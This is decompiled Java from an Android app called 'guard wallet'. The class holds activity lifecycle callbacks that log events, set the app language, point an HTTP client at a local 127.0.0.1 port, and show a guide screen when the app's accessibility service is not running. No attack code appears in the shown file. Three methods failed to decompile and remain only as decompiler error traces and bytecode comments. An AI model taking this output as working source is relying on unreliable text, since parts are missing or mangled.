package l;

import a1.q;
import android.app.Activity;
import android.app.Application.ActivityLifecycleCallbacks;
import android.os.Bundle;
import android.util.Log;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.activity.GuideActivity;
import com.guard.wallet.http.l;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.e;
import com.guard.wallet.utils.h;
import e.b;
import java.util.Locale;
import java.util.Objects;
import java.util.concurrent.TimeUnit;

public final class a implements ActivityLifecycleCallbacks {
   public static boolean a(Activity var0) {
      if (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null) {
         return false;
      } else if (var0.getComponentName() == null) {
         return false;
      } else if (Objects.equals(var0.getComponentName().getClassName(), GuideActivity.class.getName())) {
         return false;
      } else {
         return q.B(MainApplication.getInstance().getBuildConfig().getMainActivity())
            ? true
            : Objects.equals(var0.getComponentName().getClassName(), MainApplication.getInstance().getBuildConfig().getMainActivity());
      }
   }

   public final void onActivityCreated(Activity var1, Bundle var2) {
      Log.d("CustomActivityLifecycleCallbacks", "CustomActivityLifecycleCallbacks onActivityCreated");
      if (a(var1)) {
         b.b(var1);
      }
   }

   public final void onActivityDestroyed(Activity param1) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc "CustomActivityLifecycleCallbacks"
      // 02: ldc "CustomActivityLifecycleCallbacks onActivityDestroyed"
      // 04: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 07: pop
      // 08: aload 1
      // 09: invokestatic l/a.a (Landroid/app/Activity;)Z
      // 0c: ifeq 63
      // 0f: getstatic e/b.a Le/b;
      // 12: astore 3
      // 13: ldc e/b
      // 15: monitorenter
      // 16: getstatic e/b.b Ljava/lang/ref/WeakReference;
      // 19: ifnull 57
      // 1c: getstatic e/b.b Ljava/lang/ref/WeakReference;
      // 1f: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 22: ifnull 57
      // 25: aload 1
      // 26: getstatic e/b.b Ljava/lang/ref/WeakReference;
      // 29: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 2c: invokestatic java/util/Objects.equals (Ljava/lang/Object;Ljava/lang/Object;)Z
      // 2f: ifeq 57
      // 32: ldc "AbsMainActivity"
      // 34: ldc "AbsMainActivity destroy GuideActivity dismiss"
      // 36: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 39: pop
      // 3a: getstatic com/guard/wallet/utils/b.a Ljava/lang/ref/WeakReference;
      // 3d: astore 1
      // 3e: aload 1
      // 3f: ifnull 4e
      // 42: aload 1
      // 43: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 46: ifnull 4e
      // 49: bipush 1
      // 4a: istore 2
      // 4b: goto 50
      // 4e: bipush 0
      // 4f: istore 2
      // 50: iload 2
      // 51: ifeq 57
      // 54: invokestatic com/guard/wallet/utils/b.b ()V
      // 57: ldc e/b
      // 59: monitorexit
      // 5a: goto 63
      // 5d: astore 1
      // 5e: ldc e/b
      // 60: monitorexit
      // 61: aload 1
      // 62: athrow
      // 63: return
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public final void onActivityPaused(Activity var1) {
      Log.d("CustomActivityLifecycleCallbacks", "CustomActivityLifecycleCallbacks onActivityPaused");
      if (a(var1)) {
         b.b(var1);
         if (b.a != null) {
            synchronized (b.class){} // $VF: monitorenter 

            Throwable var10000;
            label127: {
               try {
                  if (b.b != null && b.b.get() != null && Objects.equals(var1, b.b.get())) {
                     Log.d("AbsMainActivity", "mainActivity pause");
                  }
               } catch (Throwable var13) {
                  var10000 = var13;
                  boolean var10001 = false;
                  break label127;
               }

               label124:
               try {
                  // $VF: monitorexit
                  return;
               } catch (Throwable var12) {
                  var10000 = var12;
                  boolean var15 = false;
                  break label124;
               }
            }

            while (true) {
               Throwable var14 = var10000;

               try {
                  // $VF: monitorexit
                  throw var14;
               } catch (Throwable var11) {
                  var10000 = var11;
                  boolean var16 = false;
                  continue;
               }
            }
         }
      }
   }

   public final void onActivityPreCreated(Activity var1, Bundle var2) {
      Log.d("CustomActivityLifecycleCallbacks", "CustomActivityLifecycleCallbacks onActivityPreCreated");
      super.onActivityPreCreated(var1, var2);
   }

   public final void onActivityPreSaveInstanceState(Activity var1, Bundle var2) {
      Log.d("CustomActivityLifecycleCallbacks", "CustomActivityLifecycleCallbacks onActivityPreSaveInstanceState");
      super.onActivityPreSaveInstanceState(var1, var2);
   }

   public final void onActivityResumed(Activity var1) {
      Log.d("CustomActivityLifecycleCallbacks", "CustomActivityLifecycleCallbacks onActivityResumed");
      if (a(var1)) {
         b.b(var1);
         if (b.a != null) {
            b var4 = b.a;
            var4.getClass();
            if (b.a() != null) {
               label75: {
                  String var6 = e.a;
                  Object var7;
                  if (b.a() != null && b.a().getBaseContext() != null) {
                     var7 = b.a();
                  } else {
                     if (LockActivity.b() == null || LockActivity.b().getBaseContext() == null) {
                        if (MainApplication.getBaseContext() != null) {
                           var8 = MainApplication.getBaseContext();
                        } else {
                           var8 = null;
                        }
                        break label75;
                     }

                     var7 = LockActivity.b();
                  }

                  var8 = var7.getBaseContext();
               }

               String var3 = e.d(var8);
               String var9 = var3;
               if (q.B(var3)) {
                  if (!q.B(Locale.getDefault().toLanguageTag())) {
                     var9 = Locale.getDefault().toLanguageTag();
                  } else {
                     var9 = Locale.getDefault().getLanguage();
                  }
               }

               if (!q.B(var9)) {
                  var3 = var9.replace("_", "-");
                  String var10 = var3;
                  if (!q.B(var3)) {
                     String[] var5 = var3.split("-");
                     var10 = var3;
                     if (var5 != null) {
                        var10 = var3;
                        if (var5.length >= 2) {
                           var3 = var5[0];
                           String var13 = var5[var5.length - 1];
                           var10 = var3;
                           if (!q.B(var13)) {
                              var10 = var3.concat("-").concat(var13);
                           }
                        }
                     }
                  }

                  h.E(var10);
               }

               l.g("http://127.0.0.1:7911");
               if (MyAccessibilityService.P() == null) {
                  boolean var2;
                  if (com.guard.wallet.utils.b.c != null
                     && com.guard.wallet.utils.b.c.get() != null
                     && !(com.guard.wallet.utils.b.c.get() instanceof GuideActivity)) {
                     var2 = false;
                  } else {
                     var2 = true;
                  }

                  if (var2) {
                     b.d.schedule(new e.a(var4, 0), 500L, TimeUnit.MILLISECONDS);
                  }
               } else {
                  com.guard.wallet.utils.b.b();
               }
            }
         }
      }
   }

   public final void onActivitySaveInstanceState(Activity var1, Bundle var2) {
      Log.d("CustomActivityLifecycleCallbacks", "CustomActivityLifecycleCallbacks onActivitySaveInstanceState");
   }

   public final void onActivityStarted(Activity param1) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc "CustomActivityLifecycleCallbacks"
      // 02: ldc "CustomActivityLifecycleCallbacks onActivityStarted"
      // 04: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 07: pop
      // 08: aload 1
      // 09: invokestatic l/a.a (Landroid/app/Activity;)Z
      // 0c: ifeq 53
      // 0f: aload 1
      // 10: invokestatic e/b.b (Landroid/app/Activity;)V
      // 13: getstatic e/b.a Le/b;
      // 16: ifnull 53
      // 19: getstatic e/b.a Le/b;
      // 1c: invokevirtual java/lang/Object.getClass ()Ljava/lang/Class;
      // 1f: pop
      // 20: ldc e/b
      // 22: monitorenter
      // 23: getstatic e/b.b Ljava/lang/ref/WeakReference;
      // 26: ifnull 47
      // 29: getstatic e/b.b Ljava/lang/ref/WeakReference;
      // 2c: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 2f: ifnull 47
      // 32: aload 1
      // 33: getstatic e/b.b Ljava/lang/ref/WeakReference;
      // 36: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 39: invokestatic java/util/Objects.equals (Ljava/lang/Object;Ljava/lang/Object;)Z
      // 3c: ifeq 47
      // 3f: ldc "AbsMainActivity"
      // 41: ldc "mainActivity start"
      // 43: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 46: pop
      // 47: ldc e/b
      // 49: monitorexit
      // 4a: goto 53
      // 4d: astore 1
      // 4e: ldc e/b
      // 50: monitorexit
      // 51: aload 1
      // 52: athrow
      // 53: return
   }

   public final void onActivityStopped(Activity param1) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
      //
      // Bytecode:
      // 00: ldc "CustomActivityLifecycleCallbacks"
      // 02: ldc "CustomActivityLifecycleCallbacks onActivityStopped"
      // 04: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 07: pop
      // 08: aload 1
      // 09: invokestatic l/a.a (Landroid/app/Activity;)Z
      // 0c: ifeq 53
      // 0f: aload 1
      // 10: invokestatic e/b.b (Landroid/app/Activity;)V
      // 13: getstatic e/b.a Le/b;
      // 16: ifnull 53
      // 19: getstatic e/b.a Le/b;
      // 1c: invokevirtual java/lang/Object.getClass ()Ljava/lang/Class;
      // 1f: pop
      // 20: ldc e/b
      // 22: monitorenter
      // 23: getstatic e/b.b Ljava/lang/ref/WeakReference;
      // 26: ifnull 47
      // 29: getstatic e/b.b Ljava/lang/ref/WeakReference;
      // 2c: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 2f: ifnull 47
      // 32: aload 1
      // 33: getstatic e/b.b Ljava/lang/ref/WeakReference;
      // 36: invokevirtual java/lang/ref/Reference.get ()Ljava/lang/Object;
      // 39: invokestatic java/util/Objects.equals (Ljava/lang/Object;Ljava/lang/Object;)Z
      // 3c: ifeq 47
      // 3f: ldc "AbsMainActivity"
      // 41: ldc "mainActivity stop"
      // 43: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 46: pop
      // 47: ldc e/b
      // 49: monitorexit
      // 4a: goto 53
      // 4d: astore 1
      // 4e: ldc e/b
      // 50: monitorexit
      // 51: aload 1
      // 52: athrow
      // 53: return
   }
}
